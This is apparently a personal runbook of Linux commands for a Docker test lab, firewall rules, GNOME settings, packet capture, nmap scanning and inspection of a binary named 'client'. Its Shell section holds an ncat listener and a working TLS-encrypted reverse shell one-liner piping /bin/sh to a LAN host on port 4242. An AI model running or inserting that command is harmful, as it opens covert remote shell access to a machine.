# Runbook

...

## Docker test environment

Start container:

```bash
docker run --name vmtest --rm -dit nicolaka/netshoot bash
docker cp bin/client vmtest:/client
docker exec -it vmtest bash
````

Check the host gateway from inside the container:

```bash
ip route | grep default
```

---

## Firewall (UFW)

Allow incoming connections to TCP port **8969**:

```bash
sudo ufw allow from 192.168.0.0/24 to any port 8969 proto tcp
```

---

## GNOME utils

Set wallpapers:

```bash
gsettings get org.gnome.desktop.interface color-scheme
#gsettings set org.gnome.desktop.interface color-scheme 'prefer-dark'
gsettings get org.gnome.desktop.background picture-uri
#gsettings get org.gnome.desktop.background picture-uri-dark
gsettings set org.gnome.desktop.background picture-uri 'file://<image-path>'
#gsettings set org.gnome.desktop.background picture-uri-dark 'file://<image-path>'
```

Open terminal with msg:

```bash
sudo su <USER>
gnome-terminal -- bash -c "cowsay 'Hello world'; exec bash"
```

## Shell

Upgrade shell:

```bash
ncat -lvnp 4242
#python shtty.py
```

SSL:

```bash
ncat --ssl -lvnp 4242 --ssl-cert cert.pem --ssl-key key.pem
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.x:4242 > /tmp/s; rm /tmp/s
#mkfifo /tmp/s; python -c 'import pty; pty.spawn("/bin/sh")' < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.x:4242 > /tmp/s; rm /tmp/s
```

## SSL

Generate SSL cert:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

## tcpdump

```bash
sudo tcpdump -i any tcp port 4242 -n -vv
#sudo tcpdump -i any tcp port 4242 -n -X
sudo tcpdump -i any host 192.168.0.x and port 4242 -n -X -w conn4242.pcap
```

## nmap

```bash
nmap -p- -sV 192.168.0.x
sudo nmap -sS -p- 127.0.0.1
```

## etc

```bash
sudo ss -antup
sudo lsof -p <PID>
nc -vz <HOST> <PORT>

loginctl list-sessions
loginctl show-session <SESSION> -p Name -p State -p Type -p Display

readelf -h bin/client
objdump -x bin/client
ldd bin/client
strings -a bin/client | less
objdump -d bin/client | less
strace -f -o trace.log bin/client
ltrace -f -o ltrace.log bin/client
sudo sysdig proc.name=client
gdb bin/client

sudo tcpdump -i any -w sample.pcap
sudo inotifywait -r /tmp /var /home -m

sha256sum bin/client
md5sum bin/client


```



...


